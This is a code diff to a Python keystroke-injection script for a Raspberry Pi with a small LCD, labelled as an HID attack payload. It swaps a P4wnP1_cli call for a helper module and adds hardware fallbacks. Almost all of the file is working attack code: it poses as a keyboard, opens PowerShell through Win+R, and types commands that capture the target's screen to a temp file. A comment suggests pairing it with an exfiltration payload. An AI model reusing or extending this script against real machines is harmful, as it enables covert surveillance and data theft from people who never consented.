@@ -10,12 +10,23 @@ This could be combined with an exfiltration payload to steal the image.
 
 import os, sys, subprocess, time
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
-import RPi.GPIO as GPIO
-import LCD_1in44, LCD_Config
-from PIL import Image, ImageDraw, ImageFont
+try:
+    import RPi.GPIO as GPIO
+    import LCD_1in44, LCD_Config
+    from PIL import Image, ImageDraw, ImageFont
+    HARDWARE_LIBS_AVAILABLE = True
+except ImportError:
+    HARDWARE_LIBS_AVAILABLE = False
+    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)
+
+from hid_helper import hid_helper # Import the new HID helper
 
 # --- Display Functions ---
 def show_message(lines, color="lime"):
+    if not HARDWARE_LIBS_AVAILABLE:
+        for line in lines:
+            print(line)
+        return
     LCD = LCD_1in44.LCD()
     LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
     image = Image.new("RGB", (128, 128), "BLACK")
@@ -29,10 +40,15 @@ def show_message(lines, color="lime"):
 
 # --- Main Attack Logic ---
 def run_attack():
+    if not HARDWARE_LIBS_AVAILABLE:
+        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
+        return
+
     show_message(["HID Attack:", "Screenshot"])
     
-    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
-        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
+    if not hid_helper.is_hid_gadget_enabled:
+        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
+        time.sleep(3)
         return
 
     # PowerShell commands to take a screenshot
@@ -43,39 +59,33 @@ def run_attack():
     cmd5 = "$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)"
     cmd6 = "$bitmap.Save('$env:TEMP\\screenshot.png')"
     
-    script = f"""
-GUI r
-delay(500)
-type("powershell")
-delay(200)
-press("ENTER")
-delay(750)
-type("{cmd1}")
-press("ENTER")
-delay(200)
-type("{cmd2}")
-press("ENTER")
-delay(200)
-type("{cmd3}")
-press("ENTER")
-delay(200)
-type("{cmd4}")
-press("ENTER")
-delay(200)
-type("{cmd5}")
-press("ENTER")
-delay(200)
-type("{cmd6}")
-press("ENTER")
-delay(500)
-type("exit")
-press("ENTER")
-"""
-    
-    cli_command = f"P4wnP1_cli hid job -c '{script}'"
-    
     try:
-        subprocess.run(cli_command, shell=True, check=True, timeout=45)
+        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
+        time.sleep(0.5)
+        hid_helper.type_string("powershell")
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.75)
+        hid_helper.type_string(cmd1)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.2)
+        hid_helper.type_string(cmd2)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.2)
+        hid_helper.type_string(cmd3)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.2)
+        hid_helper.type_string(cmd4)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.2)
+        hid_helper.type_string(cmd5)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.2)
+        hid_helper.type_string(cmd6)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.5)
+        hid_helper.type_string("exit")
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        
         show_message(["Attack Sent!", "Screenshot saved", "in %TEMP%"])
     except Exception as e:
         show_message(["Attack FAILED!"])
@@ -87,7 +97,8 @@ if __name__ == '__main__':
         run_attack()
         time.sleep(3)
     finally:
-        LCD = LCD_1in44.LCD()
-        LCD.LCD_Clear()
-        GPIO.cleanup()
+        if HARDWARE_LIBS_AVAILABLE:
+            LCD = LCD_1in44.LCD()
+            LCD.LCD_Clear()
+            GPIO.cleanup()
         print("HID Attack payload finished.")
